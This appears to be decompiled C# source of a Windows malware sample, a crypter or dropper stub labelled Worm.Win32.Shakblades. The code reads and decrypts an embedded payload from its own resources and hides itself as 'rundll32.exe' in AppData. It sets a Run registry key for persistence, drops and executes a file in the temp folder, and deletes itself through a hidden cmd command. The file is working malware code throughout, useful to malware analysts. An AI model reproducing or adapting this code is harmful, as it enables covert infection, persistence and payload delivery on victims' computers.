// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Do, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 389CBEEB-AC7D-4382-B44F-021CF6D88A76
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00009-msil\Worm.Win32.Shakblades.aqz-ff1cf34cd2fde51b680c9e863987aff6501433b07bde494b883d76e60aafb33c.exe

using \u0002;
using \u0003;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace \u0003
{
  internal sealed class \u0001 : Form
  {
    private IContainer \u0001;
    private string \u0001;
    private FileAttributes \u0001;

    public \u0001()
    {
      this.Load += new EventHandler(this.\u0001);
      this.\u0001 = FileAttributes.Hidden | FileAttributes.System;
      this.\u0001();
    }

    [DebuggerNonUserCode]
    protected override void Dispose([In] bool obj0)
    {
      try
      {
        if (!obj0)
          goto label_2;
label_1:
        if (this.\u0001 != null)
          this.\u0001.Dispose();
label_2:
        if (false)
          goto label_1;
      }
      finally
      {
        if (true)
          base.Dispose(obj0);
      }
    }

    private void \u0001()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
label_6:
      this.AutoScaleMode = AutoScaleMode.Font;
      if (false)
        goto label_3;
      else
        goto label_7;
label_2:
      this.Name = "Form1";
      this.Opacity = 0.0;
label_3:
      if (true)
      {
        this.ShowIcon = false;
        if (true)
        {
          this.ShowInTaskbar = false;
          this.ResumeLayout(false);
          return;
        }
        goto label_2;
      }
      else
        goto label_6;
label_7:
      this.ClientSize = new Size(56, 24);
      if (true)
      {
        this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
        goto label_2;
      }
      else
        goto label_3;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void \u0001([In] object obj0, [In] EventArgs obj1)
    {
      try
      {
        string Expression = \u0001.\u0001();
        byte[] bytes1;
        string[] strArray;
        do
        {
          strArray = Strings.Split(Expression, "~!LOL!~");
          bytes1 = Encoding.Default.GetBytes(Conversions.ToString(\u0001.\u0001(strArray[1], "FuCK")));
          this.\u0001 = strArray[3];
          if (Conversions.ToBoolean(strArray[2]))
            this.\u0003();
          if (Conversions.ToBoolean(strArray[4]))
          {
            try
            {
              File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          if (Conversions.ToBoolean(strArray[5]))
            this.\u0002();
          if (Conversions.ToBoolean(strArray[6]))
          {
            byte[] bytes2 = Encoding.Default.GetBytes(Conversions.ToString(\u0001.\u0001(strArray[7], "FuCK")));
            File.WriteAllBytes(Path.GetTempPath() + "\\" + strArray[8], bytes2);
          }
          else
            goto label_10;
        }
        while (false);
        Process.Start(Path.GetTempPath() + "\\" + strArray[8]);
label_10:
        \u0002.\u0002.\u0001(bytes1);
        ProjectData.EndApp();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        if (true)
          ProjectData.EndApp();
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void \u0002()
    {
      Process.Start(new ProcessStartInfo()
      {
        Arguments = "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" + Application.ExecutablePath.ToString() + "\"",
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true,
        FileName = "cmd.exe"
      });
      ProjectData.EndApp();
    }

    [DllImport("kernel32.dll", EntryPoint = "FindResource", SetLastError = true)]
    public static extern IntPtr \u0001([In] IntPtr obj0, [In] string obj1, [In] string obj2);

    [DllImport("kernel32", EntryPoint = "LoadLibraryA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr \u0001([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

    [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr \u0001(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

    public static \u0001 \u0001<\u0001>([In] string obj0, [In] string obj1)
    {
      \u0001 forFunctionPointer;
      do
      {
        if (true)
        {
          IntPtr handle = \u0001.\u0001(ref obj0);
          IntPtr ptr;
          while (true)
          {
            ref string local = ref obj1;
            ptr = \u0001.\u0001(handle, ref local);
            if (false)
              handle = ptr;
            else
              break;
          }
          System.Type t = typeof (\u0001);
          forFunctionPointer = (\u0001) Marshal.GetDelegateForFunctionPointer(ptr, t);
        }
        do
          ;
        while (false);
      }
      while (false);
      return forFunctionPointer;
    }

    public static string \u0001()
    {
      string str;
      try
      {
        \u0001.\u0001 obj1 = \u0001.\u0001<\u0001.\u0001>("kernel32", "GetModuleHandleA");
        IntPtr hm;
        IntPtr hri;
        \u0001.\u0003 obj2;
        \u0001.\u0002 obj3;
        IntPtr source;
        if (true)
        {
          obj3 = \u0001.\u0001<\u0001.\u0002>("kernel32", "SizeofResource");
          obj2 = \u0001.\u0001<\u0001.\u0003>("kernel32", "LoadResource");
          hm = obj1(Application.ExecutablePath);
          IntPtr num = hm;
          if (true)
          {
            hri = \u0001.\u0001(num, "0", "FILE_INFO");
          }
          else
          {
            source = num;
            goto label_5;
          }
        }
        IntPtr num1 = obj2(hm, hri);
        int num2 = obj3(hm, hri);
        byte[] bytes = new byte[checked (num2 - 1 + 1)];
        source = num1;
label_5:
        byte[] destination = bytes;
        int length = num2;
        Marshal.Copy(source, destination, 0, length);
        str = Encoding.Default.GetString(bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = (string) null;
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public void \u0003()
    {
      object obj = (object) (\u0001.\u0001().FileSystem.SpecialDirectories.CurrentUserApplicationData + "\\rundll32.exe");
      if (!File.Exists(Conversions.ToString(obj)))
      {
        File.Copy(Application.ExecutablePath, Conversions.ToString(obj));
        File.SetAttributes(Conversions.ToString(obj), this.\u0001);
      }
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(this.\u0001, RuntimeHelpers.GetObjectValue(obj));
    }

    public static object \u0001([In] string obj0, [In] string obj1)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      byte[] numArray1 = new byte[8];
      byte[] numArray2;
      if (true)
        numArray2 = numArray1;
      numArray2[0] = (byte) 1;
      if (true)
        goto label_9;
label_1:
      MemoryStream memoryStream = new MemoryStream();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
      try
      {
        byte[] buffer = Convert.FromBase64String(obj0);
        cryptoStream.Write(buffer, 0, buffer.Length);
        if (true)
          cryptoStream.Close();
        obj0 = Encoding.UTF8.GetString(memoryStream.ToArray());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (object) obj0;
label_9:
      numArray2[1] = (byte) 2;
      numArray2[2] = (byte) 3;
      numArray2[3] = (byte) 4;
      numArray2[4] = (byte) 5;
      numArray2[5] = (byte) 6;
      numArray2[6] = (byte) 7;
      numArray2[7] = (byte) 8;
      byte[] salt = numArray2;
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(obj1, salt);
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
      goto label_1;
    }

    public delegate IntPtr \u0001(string mn);

    public delegate int \u0002(IntPtr hm, IntPtr hri);

    public delegate IntPtr \u0003(IntPtr hm, IntPtr hri);

    public delegate IntPtr \u0004(IntPtr hm, string ln, string lt);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool \u0005(
      string appName,
      StringBuilder commandLine,
      IntPtr procAttr,
      IntPtr thrAttr,
      [MarshalAs(UnmanagedType.Bool)] bool inherit,
      int creation,
      IntPtr env,
      string curDir,
      byte[] sInfo,
      IntPtr[] pInfo);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool \u0006(IntPtr hThr, uint[] ctxt);
  }
}
